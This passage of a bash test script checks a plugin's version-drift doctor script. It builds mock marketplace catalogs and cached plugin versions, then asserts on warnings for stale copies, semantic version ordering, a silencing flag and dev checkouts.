printf '{"name":"notambourine","plugins":[{"name":"wormhook","source":{"source":"url","url":"u"}}]}\n' \
  > "$P/marketplaces/notambourine/.claude-plugin/marketplace.json"
_mkplug "$P/cache/notambourine/wormhook/0.9.0" 0.9.0
_mkplug "$P/cache/notambourine/wormhook/0.26.0" 0.26.0
assert_jq "drift: catalog install, stale copy flags 🟡 with the update command" \
  "$(_drift "$P/cache/notambourine/wormhook/0.9.0")" \
  '.systemMessage|contains("🟡") and contains("v0.9.0") and contains("v0.26.0") and contains("update wormhook@notambourine")'
# 0.26.0 vs 0.9.0 is the trap a string compare gets backwards -- newest must stay silent.
OUT="$(_drift "$P/cache/notambourine/wormhook/0.26.0")"
if [[ -z "$OUT" ]]; then _ok "drift: newest copy is silent (0.26.0 outranks 0.9.0, not lexically)"
else _bad "drift: newest copy is silent" "emitted: $OUT"; fi
OUT="$(WORMHOOK_SKIP_DRIFT=1 CLAUDE_PLUGIN_ROOT="$P/cache/notambourine/wormhook/0.9.0" \
  bash "$P/cache/notambourine/wormhook/0.9.0/scripts/doctor/drift.sh" 2>/dev/null)"
assert_jq "drift: silenced lag degrades to ⚪, never to actual silence" "$OUT" \
  '.systemMessage|contains("⚪") and contains("silenced")'

# --- path-sourced row: the plugin IS vendored in the marketplace clone, so compare there.
_mktemp_case
P="$CASE_DIR/.claude/plugins"
mkdir -p "$P/marketplaces/nt/.claude-plugin"
printf '{"name":"nt","plugins":[{"name":"wormhook","source":"./plugins/wormhook"}]}\n' \
  > "$P/marketplaces/nt/.claude-plugin/marketplace.json"
_mkplug "$P/marketplaces/nt/plugins/wormhook" 0.30.0
_mkplug "$P/cache/nt/wormhook/0.26.0" 0.26.0
assert_jq "drift: path-sourced row compares against the marketplace clone" \
  "$(_drift "$P/cache/nt/wormhook/0.26.0")" \
  '.systemMessage|contains("🟡") and contains("v0.30.0")'

# --- A dev checkout has no cache layout at all and must never emit.
OUT="$(bash "$REPO_ROOT/scripts/doctor/drift.sh" 2>/dev/null)"
if [[ -z "$OUT" ]]; then _ok "drift: dev checkout stays silent"
else _bad "drift: dev checkout stays silent" "emitted: $OUT"; fi

echo
printf 'tests: %d passed, %d failed\n' "$PASS" "$FAIL"
[[ "$FAIL" -eq 0 ]]
